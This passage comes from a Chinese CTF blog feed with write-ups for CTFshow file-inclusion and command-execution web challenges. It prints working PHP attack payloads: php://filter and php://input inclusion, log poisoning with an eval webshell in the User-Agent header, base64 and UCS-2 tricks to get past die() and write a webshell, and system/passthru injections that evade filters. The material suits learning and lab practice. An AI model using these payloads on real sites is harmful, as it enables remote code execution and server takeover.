data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/F4SzBZJ6OMENnvmp.png!thumbnail\" alt=\"\"></p>\n<p>进入环境查看代码</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/BMfuSS64eLrfjQiM.png!thumbnail\" alt=\"\"></p>\n<p>没有进行任何的过滤</p>\n<p>方法一：</p>\n<p>直接 php://fileter 伪协议读取</p>\n<p>poc：</p>\n<p><strong>?file=php://filter/convert.base64-encode/resource=flag.php</strong></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/6TbW43HalPaNNrWv.png!thumbnail\" alt=\"\"></p>\n<p>复制下来 base64 解码得到 flag</p>\n<p>方法二：</p>\n<p>bp 抓包使用？file=php://input 然后接上命令</p>\n<p><strong>语句：</strong></p>\n<p><strong> <code>&lt;?php system(&quot;cat flag.php&quot;); ?&gt;</code> </strong></p>\n<p>如图所示</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/yYRmA1Zn0B2HnGjG.png!thumbnail\" alt=\"\"></p>\n<p>获得 flag</p>\n<p><strong>ctfshow{c5e47e9f-a526-4103-8a32-cf582177a187}</strong></p>\n<h1 id=\"web79\"><a class=\"markdownIt-Anchor\" href=\"#web79\">#</a> <strong>WEB79</strong></h1>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/hvOh32Pct6J2QoYE.png!thumbnail\" alt=\"\"></p>\n<p>先开环境看看代码</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ubm5wYy0xMzExNDQxMDQwLmNvcy5hcC1zaGFuZ2hhaS5teXFjbG91ZC5jb20vaHZPaDMyUGN0NkoyUW9ZRS5wbmchdGh1bWJuYWls\">https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/hvOh32Pct6J2QoYE.png!thumbnail</span></p>\n<p>看到它把 php 给过滤了，而 str_replace 区分大小写</p>\n<p>这里涉及到一个知识点：</p>\n<blockquote>\n<p>str_replace 区分大小写，str_ireplace 不区分<br>\n因为这里是 str_replace，所以是区分大小写的，可以使用大小写变换来进行绕过</p>\n</blockquote>\n<p>配合使用 php://input</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/1DBm1Mbj75E4Of7G.png!thumbnail\" alt=\"\"></p>\n<p><strong>?file=Php://input</strong></p>\n<p><strong> <code>&lt;? php system(&quot;ls&quot;); ?&gt;</code> </strong></p>\n<p>先使用命令看看都有什么文件，看到了 flag.php，直接进行读取</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/MOuAMGKa6EDqUbAl.png!thumbnail\" alt=\"\"></p>\n<p><strong> <code>&lt;?php system(&quot;cat flag.php&quot;); ?&gt;</code> </strong></p>\n<p>得到 flag</p>\n<p 1654a8fe-95a8-423f-ada7-fc77cf4da835=\"\">ctfshow</p>\n<h1 id=\"web80\"><a class=\"markdownIt-Anchor\" href=\"#web80\">#</a> WEB80</h1>\n<p>打开环境，查看代码</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/aWljdQvbT4e0Ymd2.png!thumbnail\" alt=\"\"></p>\n<p>看到把 php 和 data 都过滤了，因此 php 和 data 的伪协议都使用不了了</p>\n<p>但是依然还是 str_replace，区分大小写，还是可以使用大小写绕过的办法</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/59zcLGHaNtrQ6LxP.png!thumbnail\" alt=\"\"></p>\n<p>看到了 fl0g.php，直接 cat 进行读取</p>\n<p><strong> <code>&lt;?php system(&quot;cat fl0g.php&quot;); ?&gt;</code> </strong></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/Xc1WS1lhZHuFLhJT.png!thumbnail\" alt=\"\"></p>\n<p>得到 flag</p>\n<p><strong>ctfshow{0101a529-78eb-4693-b926-cbd85ec90ca7}</strong></p>\n<h1 id=\"web81\"><a class=\"markdownIt-Anchor\" href=\"#web81\">#</a> <strong>WEB81</strong></h1>\n<p>打开环境，查看代码</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/sRlISoLFLXWMRxTd.png!thumbnail\" alt=\"\"></p>\n<p>在前两道题目的基础上过滤了 &quot;:&quot;，因此伪协议和大小写绕过都行不通了</p>\n<p>可以使用日志文件包含</p>\n<p>首先抓包修改 UA 头传入一句话木马</p>\n<p><strong> <code>&lt;?php @eval($_POST['a']);?&gt;</code> </strong></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/U9e6GtCr81gu6uWp.png!thumbnail\" alt=\"\"></p>\n<p>再通过 file 访问日志</p>\n<p><strong>?file=/var/log/nginx/access.log</strong></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/vw9begwVyd9D56gy.png!thumbnail\" alt=\"\"></p>\n<p>再通过命令执行测试后门</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/dMqqphy3FPxutnDq.png!thumbnail\" alt=\"\"></p>\n<p>成功，查看文件</p>\n<p><strong>a=system(“ls”);phpinfo();</strong></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/JU1JMEAme2qIvYbg.png!thumbnail\" alt=\"\"></p>\n<p>获取 flag</p>\n<p><strong>a=system(“tac fl0g.php”);phpinfo();</strong></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/uxX07sSjpyq0ljTj.png!thumbnail\" alt=\"\"></p>\n<p>当使用命令 cat<br>\nfl0g.php 时，flag 不会被显示在 2 页面上，需要去页面的注释中查看</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/bM8Z4ZfgGxCFj84r.png!thumbnail\" alt=\"\"></p>\n<p><strong>ctfshow{fa05c0f6-0d77-4782-8eaa-e5bd5285736d}</strong></p>\n<h1 id=\"web82\"><a class=\"markdownIt-Anchor\" href=\"#web82\">#</a> <strong>WEB82</strong></h1>\n<h1 id=\"web83\"><a class=\"markdownIt-Anchor\" href=\"#web83\">#</a> <strong>WEB83</strong></h1>\n<h1 id=\"web84\"><a class=\"markdownIt-Anchor\" href=\"#web84\">#</a> <strong>WEB84</strong></h1>\n<h1 id=\"web85\"><a class=\"markdownIt-Anchor\" href=\"#web85\">#</a> <strong>WEB85</strong></h1>\n<h1 id=\"web86\"><a class=\"markdownIt-Anchor\" href=\"#web86\">#</a> <strong>WEB86</strong></h1>\n<h1 id=\"web87\"><a class=\"markdownIt-Anchor\" href=\"#web87\">#</a> <strong>WEB87</strong></h1>\n<p>打开环境，查看代码</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/vk21SAptuNVjoivC.png!thumbnail\" alt=\"\"></p>\n<p>发现使用了 die，在开头就写入了 die，会直接导致代码结束执行</p>\n<p>因此需要想办法绕过 die，不然传上去的一句话不会被执行</p>\n<p>首先考虑下怎么样才能绕过 die，能想到的就是编码，而本题也没看到禁用任何的编码，因此直接使用最常规的的 base64，这里引用下<em> Monica</em> 师傅所解释的 base64 绕过方法：</p>\n<blockquote>\n<p>编码时，转换成 Base64 的最小单位就是 3 个字节<br>\n解码时，4 个字节为一组；PHP 在解码 base64 时，遇到不在其中的字符时，将会忽略这些字符，仅将合法字符组成一个新的字符串进行解码（Base64 的字符选用了 &quot;A-Z、a-z、0-9、+、/&quot;<br>\n64 个可打印字符）所以，通过 base64 解码过滤之后就只有 phpdie6<br>\n 个字符我们就要添加 2 个字符让 phpdie 和我们增加的两个字符组合起来进行解码。即可抹掉死亡函数。<br>\n总结起来就是：</p>\n</blockquote>\n<p>对已有的 php 语句，即： <code>&lt;?php die('大佬别秀了');?&gt;</code> ，进行 base64 解码时，其中的可打印字符只有 phpdie 这 6 个字符，我们知道只有 die 被解码了，才能成功绕过，而解码是为 4 个字节为一组，因此我们只要添加两个字符拼接上去，就为八个字符，正好两组，能够被成功解码，从而绕过 die</p>\n<p>而这里将 php 过滤了，因此需要进行 url 编码，并且进行两次 url 编码</p>\n<p>（因为 get 传参的时候会进行一次 urldecode，只进行一次编码的话，同样的一次解码就会使 php 同样被过滤掉）</p>\n<p><strong>?file=php://filter/write=convert.base64-decode/resource=1.php</strong></p>\n<p>进行两次 url 编码后：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?file=%25%37%30%25%36%38%25%37%30%25%33%41%25%32%46%25%32%46%25%36%36%25%36%39%25%36%43%25%37%34%25%36%35%25%37%32%25%32%46%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%44%25%36%33%25%36%46%25%36%45%25%37%36%25%36%35%25%37%32%25%37%34%25%32%45%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%44%25%36%34%25%36%35%25%36%33%25%36%46%25%36%34%25%36%35%25%32%46%25%37%32%25%36%35%25%37%33%25%36%46%25%37%35%25%37%32%25%36%33%25%36%35%25%33%44%25%33%31%25%32%45%25%37%30%25%36%38%25%37%30</span><br></pre></td></tr></table></figure>\n<p>post 传入一句话：<br>\n<strong> <code>&lt;?php eval($_POST[1]);?&gt;</code> </strong></p>\n<p>这里需要将该一句话进行 base64 编码并在前面加上两个字符用来解码的时候绕过 die</p>\n<p>PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8+</p>\n<p>这里涉及到一个知识点，base64 之后末尾为 +，需要将 + 进行 urlencode</p>\n<p>还是引用刚才那个大师傅的解释：</p>\n<blockquote>\n<p>如果直接传入 content，这里的 + 会被当做空格处理，所以在 base64 解码的时候就会忽略空格，自动在后面加上一个 =：即 PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8=<br>\n 而加号被当成空格传入被加上 = 进行解码后的结果是：&lt;?php<br>\neval($_POST[1]);?</p>\n</blockquote>\n<p>并不是一个完整的一句话了，因此我们想要保留 + 的话就需要对其进行 url 编码</p>\n<p>（同时这里也可以换一个一句话，使其编码之后不带 +）</p>\n<p>最终的一句话：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">content=aaPD9waHAgZXZhbCgkX1BPU1RbMV0pOz8%2B</span><br></pre></td></tr></table></figure>\n<p>传入一句话如图所示</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/qOBya9uN89lltL80.png!thumbnail\" alt=\"\"></p>\n<p>访问 1.php 然后进行命令执行获取 flag</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/UKfoSt3626AP9jKS.png!thumbnail\" alt=\"\"></p>\n<p>测试 phpinfo 成功</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/4GrysQ0aVr6ajxrz.png!thumbnail\" alt=\"\"></p>\n<p><strong>1=system(“ls”);phpinfo();</strong></p>\n<p>找到目录下的文件，tac fl0g.php 获得 flag</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/j4fH5XQL6rzYg2f3.png!thumbnail\" alt=\"\"></p>\n<p>得到 flag</p>\n<p><strong>ctfshow{d9f22b7f-b350-4e0e-acf1-18e9e27af3f0}</strong></p>\n<h1 id=\"web88\"><a class=\"markdownIt-Anchor\" href=\"#web88\">#</a> WEB88</h1>\n<p>打开环境，查看代码</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/lmgVvcyhUZDD9i6Q.png!thumbnail\" alt=\"\"></p>\n<p>看到过滤了 php，但是没有过滤 data，因此使用 data 伪协议</p>\n<p>语句：</p>\n<p><strong>?file=data://text/plain;base64, <code>&lt;?php eval($_POST['ttxxxxx']);?&gt;</code> x</strong></p>\n<p>payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?file=data://text/plain;base64,PD9waHAgZXZhbCgkX1BPU1RbJ3R0eHh4eHgnXSk7Pz54</span><br></pre></td></tr></table></figure>\n<p>后面加一个 x 是为了消除等号，但也可以直接把等号删除<br>\n但如果出现了 + 号，就需要换个一句话进行 base64encode</p>\n<p>传入 payload</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/OvmizlWuUVNnusUe.png!thumbnail\" alt=\"\"></p>\n<p>测试 phpinfo 成功</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/HLsNSa6EI77kIXQL.png!thumbnail\" alt=\"\"></p>\n<p>命令查看目录下文件</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/TzlryihFnVCT9TeZ.png!thumbnail\" alt=\"\"></p>\n<p>查看 fl0g.php 获得 flag</p>\n<p><strong>ttxxxxx=system(“tac fl0g.php”);phpinfo();</strong></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/2f3jwWipdXoKUKct.png!thumbnail\" alt=\"\"></p>\n<p>得到 flag</p>\n<p><strong>ctfshow{8d138758-6761-4e74-a355-d204633d4bfb}</strong></p>\n<h1 id=\"web116\"><a class=\"markdownIt-Anchor\" href=\"#web116\">#</a> <strong>WEB116</strong></h1>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/HjBEQ5XLcxWcfMJY.png!thumbnail\" alt=\"\"></p>\n<p>提示是有 misc 成分在其中</p>\n<p>打开环境发现是一个视频</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/iLDrEOAKTQCpi4ak.png!thumbnail\" alt=\"\"></p>\n<p>右键保存下来，拖入 winhex 看看</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/418X0kDUvQZS6vsp.png!thumbnail\" alt=\"\"></p>\n<p>发现文件尾是以 png 的 16 进制结尾，因此把该 png 分离出来</p>\n<p>kali 中使用 foremost 或 binwalk 分离（也可以直接手动分离）</p>\n<p><strong>foremost 1.mp4</strong></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/k0A9HquCF4UB0NhF.png!thumbnail\" alt=\"\"></p>\n<p>得到一个 output 文件夹</p>\n<p>拿到 png</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/YqMCKq3paUDvQP2g.png!thumbnail\" alt=\"\"></p>\n<p>查看代码，发现禁用了一些编码和 data，但是没有禁用 php，直接 bp 抓包读取 flag.php</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/wGVkrvMJ1wI8fLlb.png!thumbnail\" alt=\"\"></p>\n<p>得到 flag，</p>\n<p><strong>ctfshow{81c35502-a3c5-4172-91cc-5640d84ce015}</strong></p>\n<h1 id=\"web117\"><a class=\"markdownIt-Anchor\" href=\"#web117\">#</a> WEB117</h1>\n<p>打开环境，查看代码</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/n7bf45TrXNy4Go78.png!thumbnail\" alt=\"\"></p>\n<p>发现 data 被禁用了，而 php 没有被禁用，但是有 die 函数，所以需要想办法绕过 die 函数</p>\n<p>和 WEB87 很相似，但是这里的 rot13 和 base64 都被禁用了，只能另寻编码使用</p>\n<p>这里就用到了 ucs-2 编码</p>\n<p>usc-2：</p>\n<p>会对目标字符串进行两位一反转</p>\n<p>（因此字符串中的字符数目得是偶数）</p>\n<p>pyload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=nnnpc.php</span><br></pre></td></tr></table></figure>\n<p>post 传参：<br>\n<strong>contents=?&lt;hp pvela$(P_SO[T]1;)&gt;?</strong></p>\n<blockquote>\n<p>本题原理就是传入先进行两位翻转好的一句话，拼接到死亡函数之后再因为 usc-2 再次进行两位翻转，一句话成功还原，而 die 函数被翻转过滤掉，反转后即：<br>\n?&lt;hp pid(e;)&gt;? <code>&lt;?php eval($_POST[1]);?&gt;</code></p>\n</blockquote>\n<p>然后访问 nnnpc.php 进行命令执行</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/BM13OPRRJ6ji7r71.png!thumbnail\" alt=\"\"></p>\n<p>查看 phpinfo 成功，查看目录下的文件</p>\n<p><strong>1=system(“ls”);phpinfo();</strong></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/fmM4wyKHzy4bR2Wn.png!thumbnail\" alt=\"\"></p>\n<p>查看 flag.php 获取 flag</p>\n<p><strong>1=system(“tac flag.php”);phpinfo();</strong></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/XhG2Ag0HC1VwZwyB.png!thumbnail\" alt=\"\"></p>\n<p>得到 flag</p>\n<p><strong>ctfshow{f57f34ae-acb2-48db-9e4f-71b53a8be8e2}</strong></p>\n",
            "tags": [
                "WEB"
            ]
        },
        {
            "id": "https://nnnpc.github.io/2024/04/16/CTFshow%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/",
            "url": "https://nnnpc.github.io/2024/04/16/CTFshow%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/",
            "title": "CTFshow命令执行",
            "date_published": "2024-04-16T05:58:18.974Z",
            "content_html": "<h1 id=\"web29\"><a class=\"markdownIt-Anchor\" href=\"#web29\">#</a> WEB29</h1>\n<p>打开环境，查看代码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> &lt;?php</span><br><span class=\"line\"></span><br><span class=\"line\">/*</span><br><span class=\"line\"># -*- coding: utf-8 -*-</span><br><span class=\"line\"># @Author: h1xa</span><br><span class=\"line\"># @Date:   2020-09-04 00:12:34</span><br><span class=\"line\"># @Last Modified by:   h1xa</span><br><span class=\"line\"># @Last Modified time: 2020-09-04 00:26:48</span><br><span class=\"line\"># @email: h1xa@ctfer.com</span><br><span class=\"line\"># @link: https://ctfer.com</span><br><span class=\"line\"></span><br><span class=\"line\">*/</span><br><span class=\"line\"></span><br><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class=\"line\">    $c = $_GET[&#x27;c&#x27;];</span><br><span class=\"line\">    if(!preg_match(&quot;/flag/i&quot;, $c))&#123;</span><br><span class=\"line\">        eval($c);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">&#125;else&#123;</span><br><span class=\"line\">    highlight_file(__FILE__);</span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n<p>发现过滤了大小写的 flag<br>\n<strong>?c=system(“ls”);</strong></p>\n<p>先进行命令执行查看有什么文件</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/zm6V8snCDL5v61b3.png!thumbnail\" alt=\"\"></p>\n<p>发现了 flag.php，进行查看该文件</p>\n<p>由于过滤了 flag 这个字符串，因此需要用？或者通配符 * 来进行代替</p>\n<p>或者也可以将 flag 进行隔断，这里有很多种姿势，可以都尝试下</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?c=system(&quot;cat f*&quot;);</span><br><span class=\"line\">?c=system(&quot;cat fla&#x27;&#x27;g.php&quot;);</span><br><span class=\"line\">?c=system(&quot;cat fla?.php&quot;);</span><br></pre></td></tr></table></figure>\n<p>读取的话可以使用 cat、tac、nl 等</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?c=system(&quot;cat fla?.php&quot;);</span><br><span class=\"line\">?c=system(&quot;nl fla?.php&quot;);</span><br><span class=\"line\">?c=system(&quot;tac fla?.php&quot;);</span><br></pre></td></tr></table></figure>\n<p>不同是在 tac 和 nl 能直接把 flag 显示在页面上，而 cat 需要去注释中寻找<br>\n读取得到 flag</p>\n<p><strong>ctfshow{6c31e09f-272e-4f25-b30f-37ed59424304}</strong></p>\n<h1 id=\"web30\"><a class=\"markdownIt-Anchor\" href=\"#web30\">#</a> <strong>WEB30</strong></h1>\n<p>打开环境查看代码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\"></span><br><span class=\"line\">/*</span><br><span class=\"line\"># -*- coding: utf-8 -*-</span><br><span class=\"line\"># @Author: h1xa</span><br><span class=\"line\"># @Date:   2020-09-04 00:12:34</span><br><span class=\"line\"># @Last Modified by:   h1xa</span><br><span class=\"line\"># @Last Modified time: 2020-09-04 00:42:26</span><br><span class=\"line\"># @email: h1xa@ctfer.com</span><br><span class=\"line\"># @link: https://ctfer.com</span><br><span class=\"line\"></span><br><span class=\"line\">*/</span><br><span class=\"line\"></span><br><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class=\"line\">    $c = $_GET[&#x27;c&#x27;];</span><br><span class=\"line\">    if(!preg_match(&quot;/flag|system|php/i&quot;, $c))&#123;</span><br><span class=\"line\">        eval($c);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">&#125;else&#123;</span><br><span class=\"line\">    highlight_file(__FILE__);</span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n<p>发现除了 flag 被过滤了，还有 system 和 php 同样都被过滤了，既然 system 不能用了那就换成 passthru () 继续进行命令执行<br>\n关于 php 字符串的过滤，可以直接使用 f * 来代替 flag.php，或者截断，或者使用？来代替</p>\n<p>（同样的姿势来绕过，禁用了什么就用同样的姿势绕过什么）</p>\n<p>如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?c=passthru(&quot;tac f*&quot;);</span><br><span class=\"line\">?c=passthru(&quot;tac fla&#x27;&#x27;g.ph&#x27;&#x27;p&quot;);</span><br><span class=\"line\">?c=passthru(&quot;tac fla&#x27;&#x27;g.???&quot;);</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/2l2mDbc6VRWCJnu0.png!thumbnail\" alt=\"\"></p>\n<p>得到 flag</p>\n<p><strong>ctfshow{66e20265-d458-4936-896c-44916e273edb}</strong></p>\n<h1 id=\"web31\"><a class=\"markdownIt-Anchor\" href=\"#web31\">#</a> <strong>WEB31</strong></h1>\n<p>打开环境查看代码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> &lt;?php</span><br><span class=\"line\"></span><br><span class=\"line\">/*</span><br><span class=\"line\"># -*- coding: utf-8 -*-</span><br><span class=\"line\"># @Author: h1xa</span><br><span class=\"line\"># @Date:   2020-09-04 00:12:34</span><br><span class=\"line\"># @Last Modified by:   h1xa</span><br><span class=\"line\"># @Last Modified time: 2020-09-04 00:49:10</span><br><span class=\"line\"># @email: h1xa@ctfer.com</span><br><span class=\"line\"># @link: https://ctfer.com</span><br><span class=\"line\"></span><br><span class=\"line\">*/</span><br><span class=\"line\"></span><br><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class=\"line\">    $c = $_GET[&#x27;c&#x27;];</span><br><span class=\"line\">    if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\\.| |\\&#x27;/i&quot;, $c))&#123;</span><br><span class=\"line\">        eval($c);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">&#125;else&#123;</span><br><span class=\"line\">    highlight_file(__FILE__);</span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n<p>在前一题的基础上过滤了 cat|sort|shell 这些字符串和点、空格、单引号，cat 很明显不能用了，但是 tac 和 nl 还是没有被过滤，因此绕过字符串过滤的方法还是和的前面的 pyload 一样，只不过需要绕过被过滤的空格，这里可以使用 %09 来代替空格进行绕过<br>\n？c=passthru (“tac%09f*”);</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">知识点：</span><br><span class=\"line\">绕过cat使用tac more less head tac tail nl od(二进制查看) vi vim sort uniq</span><br><span class=\"line\">绕过空格用%09 &lt;&gt; $&#123;IFS&#125; $IFS$9 &#123;cat,fl*&#125; %20</span><br></pre></td></tr></table></figure>\n<p>这里也列出其他师傅的 pyload 来参考学习</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?c=passthru(&quot;nl%09`ls`&quot;);//在注释中查看flag</span><br></pre></td></tr></table></figure>\n<p>本题开始也介绍一个很骚的姿势，用 include 进行包含，使用 php:filter 伪协议，payload 如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?c=include$_GET[&quot;nnnpc&quot;];&amp;nnnpc=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>\n<p>由于 c 传参中没有被过滤的字符，而 nnnpc 中的 php:filter 伪协议并不是 c 直接传参进去，而是被 include 进行包含进去的，因此不会被过滤，使用该伪协议直接将 flag 进行了 base64 输出在 web 页面上<br>\n这里就展示一开始最简单的 %09 绕过空格的办法了</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/A982XmrnNzFSWx7m.png!thumbnail\" alt=\"\"></p>\n<p>最终得到 flag</p>\n<p><strong>ctfshow{98c19e7b-17b8-4a44-bdd8-4837fe3b3a23}</strong></p>\n<h1 id=\"web32\"><a class=\"markdownIt-Anchor\" href=\"#web32\">#</a> <strong>WEB32</strong></h1>\n<p>打开环境，查看代码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> &lt;?php</span><br><span class=\"line\"></span><br><span class=\"line\">/*</span><br><span class=\"line\"># -*- coding: utf-8 -*-</span><br><span class=\"line\"># @Author: h1xa</span><br><span class=\"line\"># 